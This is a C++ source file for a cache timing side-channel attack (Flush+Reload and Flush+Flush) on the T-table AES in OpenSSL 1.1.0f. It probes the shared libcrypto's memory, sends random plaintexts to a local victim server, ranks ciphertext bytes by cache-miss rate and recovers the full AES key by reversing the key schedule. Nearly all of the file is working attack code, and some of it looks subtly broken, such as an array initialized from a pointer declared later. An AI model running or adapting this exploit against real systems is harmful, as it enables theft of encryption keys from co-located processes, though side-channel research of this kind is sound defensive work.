#include <unistd.h>
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <string.h> 
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include <map>
#include <vector>
#include <iostream>
#include <bitset>
#include <sys/socket.h> 
#include  <iomanip>

// more encryptions show features more clearly
int ITERATIONS = (20000);

// enable for same-process attack, default is separate server process
#define ENABLE_DEBUG (0)

#define PORT 10000 
#define SA struct sockaddr 

unsigned long long req_sent = 0;
int garbage_collection_var = 0;

// Runtime variables, do not change initializations
size_t last_hit = 0;
size_t sequence = 0;
size_t potential_hit = 0;
size_t iter_no = 0;
int tl = 0;
int th = 0;

// Victim specific parameters, shouldn't need to change it 
int burst_gap = 400;

// Attack specific parameters, change it as per calibration results
int regular_gap = 400;
int step_width = 21725; 

#define T_ARRAY_SIZE (1)
int tl_array[T_ARRAY_SIZE] = {160};
int th_array[T_ARRAY_SIZE] = {278};

// Memory addresses to probe, change it as per T-Table addresses
char* probe[] = { 
base + 0x1d3920, base + 0x1d3d20, base + 0x1d4120, base + 0x1d4520
};

// TODO: Optional- change baseline F+R threshold as per baseline calibration results
int flush_flush_threshold = tl_array[T_ARRAY_SIZE-1];

int enable_flush_flush = 0;
int thread_running = 0;
pthread_cond_t      cond  = PTHREAD_COND_INITIALIZER;
pthread_mutex_t     mutex = PTHREAD_MUTEX_INITIALIZER;

int set_affinity(long thread_id, int cpu_id){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id,&mask);
    pthread_setaffinity_np(thread_id,sizeof(cpu_set_t),&mask);
}

int measure_flush_latency(void* addr){
    size_t time, newtime, delta;
    asm volatile ("mfence");
    asm volatile ("lfence");
    asm volatile ("rdtsc" : "=a" (time), "=d" (delta));
    time = (delta<<32) | time;
    asm volatile ("lfence");
    asm volatile ("clflush 0(%0)\n"
    :
    : "c" (addr)
    : "rax");
    asm volatile ("mfence");
    asm volatile ("lfence");
    asm volatile ("rdtsc" : "=a" (newtime), "=d" (delta));
    newtime = (delta<<32) | newtime;
    asm volatile ("lfence");
    delta = newtime - time;
    return delta;
}

int measure_access_latency(void* addr){
    int delta;
    asm volatile(
        " mfence           \n\t"
        " lfence           \n\t"
        " rdtsc            \n\t"
        " lfence           \n\t"
        " mov %%rax, %%rdi \n\t"
        " mov (%1), %%r8   \n\t"
        " lfence           \n\t"
        " rdtsc            \n\t"
        " sub %%rdi, %%rax \n\t"
        : "=a"(delta) /*output*/
        : "c"(addr)
        : "r8", "rdi");
    return delta;
}

void *cached_in_c1(void *addr){
    set_affinity(pthread_self(),sysconf(_SC_NPROCESSORS_CONF)/4);
    int i = (measure_access_latency(addr)%2);
    pthread_mutex_lock(&mutex);
    thread_running = 1;
    pthread_cond_signal(&cond);
    pthread_mutex_unlock(&mutex);
    for(int i=0;i<100;i++){
        flush(&i);
        i += (measure_access_latency(addr)%2);
        if (thread_running == 0) {
            break;
        }
    }
}

void compute_intensive_code(int sequence){
    long x, y;
    x = 5;
    y = 6;
    int wait_gap = regular_gap;
    if(sequence)	wait_gap = burst_gap;
    for (int i = 0; i < wait_gap; ++i){
        flush(&wait_gap);
        x *= y;
        y *=x;
        if(i%7==0){
            x = y/5.2;
            y = x*0.81;
        }
        else if(i%17==0){
            x = y%13;
            y = x%6;
        }
        else{
            x = y/(x+1);
            y = 4*x/(3*y+7);
        }
    }
}

void verify_threshold(void *addr){
    set_affinity(pthread_self(),0);
    
    pthread_t t;
    if (!ENABLE_DEBUG) {
        pthread_create(&t,NULL,cached_in_c1,addr);
        pthread_mutex_lock(&mutex);
        while (thread_running == 0) pthread_cond_wait(&cond, &mutex);
    }
    else {
        garbage_collection_var += measure_access_latency(addr);
        compute_intensive_code(regular_gap);
    }

    size_t delta = measure_flush_latency(addr);

    if (!ENABLE_DEBUG) {
        thread_running = 0;
        pthread_mutex_unlock(&mutex);
        pthread_join(t,NULL);
    }

    if(delta >= tl && delta <= th)
        ;
    else{
        int i;
        for(i = 0; i < T_ARRAY_SIZE; i++){
            if(delta >= tl_array[i] && delta <= th_array[i])
                break;
        }
        if(i >= 0 && i < T_ARRAY_SIZE){
            tl = tl_array[i];
            th = th_array[i];
            iter_no = step_width*i;
        }
        else{
            for(i = 0; i < T_ARRAY_SIZE; i++){
                if(delta >= tl_array[i])
                    break;
            }
            if(i >= 0 && i < T_ARRAY_SIZE){
                tl = tl_array[i];
                th = th_array[i];
                iter_no = step_width*i;
            }
            else{
                tl = tl_array[T_ARRAY_SIZE-1];
                th = th_array[T_ARRAY_SIZE-1];
                iter_no = step_width*(T_ARRAY_SIZE - 1);
            }
        }
        return;
    }   
}

int isMiss(size_t delta, void *addr)
{
    if (enable_flush_flush) {
        if (delta >= flush_flush_threshold) {
            return 0;
        }
        else {
            return 1;
        }
    }
    int ret = 0;
    iter_no++;
    tl = tl_array[(iter_no < ((T_ARRAY_SIZE - 1)*step_width) ? iter_no : (T_ARRAY_SIZE - 1)*step_width)/step_width];
    th = th_array[(iter_no < ((T_ARRAY_SIZE - 1)*step_width) ? iter_no : (T_ARRAY_SIZE - 1)*step_width)/step_width];

    if(delta >= tl && delta <= th){
        ;
    }
    else{
        ret = 1;
    }
    if(iter_no%400 == 0){
        verify_threshold(addr);
        sched_yield();            
    }
    else{
        compute_intensive_code(sequence);
    }

    return ret;
}

AES_KEY key_struct;

void func(int sockfd, unsigned char* plaintext, unsigned char* ciphertext) 
{
    req_sent++;

    // if(req_sent%80000==0)
	//     printf("%lld req sent\n",req_sent);

    if(ENABLE_DEBUG)
    	AES_encrypt(plaintext, ciphertext, &key_struct);

    else
    {
    	write(sockfd, plaintext, 16);
    	read(sockfd, ciphertext, 128);
    }
} 



static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

unsigned char key[] =
{
  0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
  0xff, 0x00, 0xee, 0xdd, 0xcc, 0xbb, 0xaa, 0x99,
};

size_t sum;
size_t scount;

char* base;
char* end;

int bot_elems(double *arr, int N, int *bot, int n) {
  /*
     insert into bot[0],...,bot[n-1] the indices of n smallest elements 
     of arr[0],...,arr[N-1]
  */
  int bot_count = 0;
  int i;
  for (i=0;i<N;++i) {
    int k;
    for (k=bot_count;k>0 && arr[i]<arr[bot[k-1]];k--);
    if (k>=n) continue; 
    int j=bot_count;
    if (j>n-1) { 
      j=n-1;
    } else { 
      bot_count++;
    }
    for (;j>k;j--) {
      bot[j]=bot[j-1];
    }
    bot[k] = i;
  }
  return bot_count;
}

uint32_t subWord(uint32_t word) {
  uint32_t retval = 0;

  uint8_t t1 = sbox[(word >> 24) & 0x000000ff];
  uint8_t t2 = sbox[(word >> 16) & 0x000000ff];
  uint8_t t3 = sbox[(word >> 8 ) & 0x000000ff];
  uint8_t t4 = sbox[(word      ) & 0x000000ff];

  retval = (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;

  return retval;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: ./dfr <iterations>\n");
        exit(1);
    }
    else {
        ITERATIONS = atoi(argv[1]);
    }
    if (argc > 2) {
        enable_flush_flush = 1;
        int val = atoi(argv[2]);
        if (val > 1) {
            flush_flush_threshold = val;
        }
    }

    int sockfd, connfd; 
    if (!ENABLE_DEBUG)
    {
        struct sockaddr_in servaddr, cli; 

        // socket create and varification 
        sockfd = socket(AF_INET, SOCK_STREAM, 0); 
        if (sockfd == -1) { 
            printf("socket creation failed...\n"); 
            exit(0); 
        } 
        else
            printf("Socket successfully created..\n"); 
        bzero(&servaddr, sizeof(servaddr)); 

        // assign IP, PORT 
        servaddr.sin_family = AF_INET; 
        servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
        servaddr.sin_port = htons(PORT); 

        // connect the client socket to server socket 
        if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) { 
            printf("connection with the server failed...\n"); 
            exit(0); 
        } 
        else
            printf("connected to the server..\n"); 
    }

    int fd = open("./openssl-1.1.0f/build/lib/libcrypto.so", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    if (size == 0)
    exit(-1);
    size_t map_size = size;
    if (map_size & 0xFFF != 0)
    {
    map_size |= 0xFFF;
    map_size += 1;
    }
    base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
    end = base + size;

    unsigned char plaintext[] =
    {
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    };
    unsigned char ciphertext[128];
    unsigned char restoredtext[128];
    int countKeyCandidates[16][256];
    int cacheMisses[16][256];
    int totalEncs[16][256];
    double missRate[16][256];
    int lastRoundKeyGuess[16];

    for (int i=0; i<16; i++) {
    for (int j=0; j<256; j++) {
        totalEncs[i][j] = 0;
        cacheMisses[i][j] = 0;
        countKeyCandidates[i][j] = 0;
    }
    }

    if(ENABLE_DEBUG)
        AES_set_encrypt_key(key, 128, &key_struct);

    uint64_t min_time = rdtsc();
    srand(min_time);
    sum = 0;

    // encryptions for Te0
    for (int i = 0; i < ITERATIONS; ++i)
    {
    for (size_t j = 0; j < 16; ++j)
        plaintext[j] = rand() % 256;
    flush(probe[0]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_flush_latency(probe[0]);
    totalEncs[2][(int) ciphertext[2]]++;
    totalEncs[6][(int) ciphertext[6]]++;
    totalEncs[10][(int) ciphertext[10]]++;
    totalEncs[14][(int) ciphertext[14]]++;
    if (isMiss(delta, probe[0])) {
        cacheMisses[2][(int) ciphertext[2]]++;
        cacheMisses[6][(int) ciphertext[6]]++;
        cacheMisses[10][(int) ciphertext[10]]++;
        cacheMisses[14][(int) ciphertext[14]]++;
    }
    }

    // encryptions for Te1
    for (int i = 0; i < ITERATIONS; ++i)
    {
    for (size_t j = 0; j < 16; ++j)
        plaintext[j] = rand() % 256;
    flush(probe[1]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_flush_latency(probe[1]);
    totalEncs[3][(int) ciphertext[3]]++;
    totalEncs[7][(int) ciphertext[7]]++;
    totalEncs[11][(int) ciphertext[11]]++;
    totalEncs[15][(int) ciphertext[15]]++;
    if (isMiss(delta, probe[1])) {
        cacheMisses[3][(int) ciphertext[3]]++;
        cacheMisses[7][(int) ciphertext[7]]++;
        cacheMisses[11][(int) ciphertext[11]]++;
        cacheMisses[15][(int) ciphertext[15]]++;
    }
    }

    // encryptions for Te2
    for (int i = 0; i < ITERATIONS; ++i)
    {
    for (size_t j = 0; j < 16; ++j)
        plaintext[j] = rand() % 256;
    flush(probe[2]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_flush_latency(probe[2]);
    totalEncs[0][(int) ciphertext[0]]++;
    totalEncs[4][(int) ciphertext[4]]++;
    totalEncs[8][(int) ciphertext[8]]++;
    totalEncs[12][(int) ciphertext[12]]++;
    if (isMiss(delta, probe[2])) {
        cacheMisses[0][(int) ciphertext[0]]++;
        cacheMisses[4][(int) ciphertext[4]]++;
        cacheMisses[8][(int) ciphertext[8]]++;
        cacheMisses[12][(int) ciphertext[12]]++;
    }
    }

    // encryptions for Te3
    for (int i = 0; i < ITERATIONS; ++i)
    {
    for (size_t j = 0; j < 16; ++j)
        plaintext[j] = rand() % 256;
    flush(probe[3]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_flush_latency(probe[3]);    
    totalEncs[1][(int) ciphertext[1]]++;
    totalEncs[5][(int) ciphertext[5]]++;
    totalEncs[9][(int) ciphertext[9]]++;
    totalEncs[13][(int) ciphertext[13]]++;
    if (isMiss(delta, probe[3])) {
        cacheMisses[1][(int) ciphertext[1]]++;
        cacheMisses[5][(int) ciphertext[5]]++;
        cacheMisses[9][(int) ciphertext[9]]++;
        cacheMisses[13][(int) ciphertext[13]]++;
    }
    }

    // calculate the cache miss rates 
    for (int i=0; i<16; i++) {
    for (int j=0; j<256; j++) {
        missRate[i][j] = (double) cacheMisses[i][j] / totalEncs[i][j];
    }
    }

    int botIndices[16][16];
    // get the values of lowest missrates
    for (int i=0; i<16; i++) {
    bot_elems(missRate[i], 256, botIndices[i], 16);
    }

    for (int i=0; i<16; i++) {
    // loop through ciphertext bytes with lowest missrates
    for (int j=0; j<16; j++) {
        countKeyCandidates[i][botIndices[i][j] ^ 99]++;
        countKeyCandidates[i][botIndices[i][j] ^ 124]++;
        countKeyCandidates[i][botIndices[i][j] ^ 119]++;
        countKeyCandidates[i][botIndices[i][j] ^ 123]++;
        countKeyCandidates[i][botIndices[i][j] ^ 242]++;
        countKeyCandidates[i][botIndices[i][j] ^ 107]++;
        countKeyCandidates[i][botIndices[i][j] ^ 111]++;
        countKeyCandidates[i][botIndices[i][j] ^ 197]++;
        countKeyCandidates[i][botIndices[i][j] ^ 48]++;
        countKeyCandidates[i][botIndices[i][j] ^ 1]++;
        countKeyCandidates[i][botIndices[i][j] ^ 103]++;
        countKeyCandidates[i][botIndices[i][j] ^ 43]++;
        countKeyCandidates[i][botIndices[i][j] ^ 254]++;
        countKeyCandidates[i][botIndices[i][j] ^ 215]++;
        countKeyCandidates[i][botIndices[i][j] ^ 171]++;
        countKeyCandidates[i][botIndices[i][j] ^ 118]++;
    }
    }

    // find the max value in countKeyCandidate...
    // this is our guess at the key byte for that ctext position
    for (int i=0; i<16; i++) {
    int maxValue = 0;
    int maxIndex;
    for (int j=0; j<256; j++) {
        if (countKeyCandidates[i][j] > maxValue) {
        maxValue = countKeyCandidates[i][j];
        maxIndex = j;
        }
    }
    // save in the guess array
    lastRoundKeyGuess[i] = maxIndex;
    }

    // Algorithm to recover the master key from the last round key
    uint32_t roundWords[4];
    roundWords[3] = (((uint32_t) lastRoundKeyGuess[12]) << 24) ^
                    (((uint32_t) lastRoundKeyGuess[13]) << 16) ^
                    (((uint32_t) lastRoundKeyGuess[14]) << 8 ) ^
                    (((uint32_t) lastRoundKeyGuess[15])      );

    roundWords[2] = (((uint32_t) lastRoundKeyGuess[8] ) << 24) ^
                    (((uint32_t) lastRoundKeyGuess[9] ) << 16) ^
                    (((uint32_t) lastRoundKeyGuess[10]) << 8 ) ^
                    (((uint32_t) lastRoundKeyGuess[11])      );

    roundWords[1] = (((uint32_t) lastRoundKeyGuess[4] ) << 24) ^
                    (((uint32_t) lastRoundKeyGuess[5] ) << 16) ^
                    (((uint32_t) lastRoundKeyGuess[6] ) << 8 ) ^
                    (((uint32_t) lastRoundKeyGuess[7] )      );

    roundWords[0] = (((uint32_t) lastRoundKeyGuess[0] ) << 24) ^
                    (((uint32_t) lastRoundKeyGuess[1] ) << 16) ^
                    (((uint32_t) lastRoundKeyGuess[2] ) << 8 ) ^
                    (((uint32_t) lastRoundKeyGuess[3] )      );

    uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
    uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
                        0x20000000, 0x10000000, 0x08000000, 0x04000000,
                        0x02000000, 0x01000000 };
    // loop to backtrack aes key expansion
    for (int i=0; i<10; i++) {
    tempWord4 = roundWords[3] ^ roundWords[2];
    tempWord3 = roundWords[2] ^ roundWords[1];
    tempWord2 = roundWords[1] ^ roundWords[0];

    uint32_t rotWord = (tempWord4 << 8) ^ (tempWord4 >> 24);

    tempWord1 = (roundWords[0] ^ rcon[i] ^ subWord(rotWord));

    roundWords[3] = tempWord4;
    roundWords[2] = tempWord3;
    roundWords[1] = tempWord2;
    roundWords[0] = tempWord1;
    }
    printf("KEY ");
    for(int i=0; i<4; i++) {
        std::cout << std::hex << std::setfill('0') << std::setw(4) << (roundWords[i]);
        // std::cout << std::bitset<32>(roundWords[i]);
    }
    printf("\n");

    close(fd);
    munmap(base, map_size);
    fflush(stdout);
    printf("Random variable value to avoid compiler optimizations: %d\n", garbage_collection_var);
    if (!ENABLE_DEBUG)
        close(sockfd); 
    
    return 0;
}



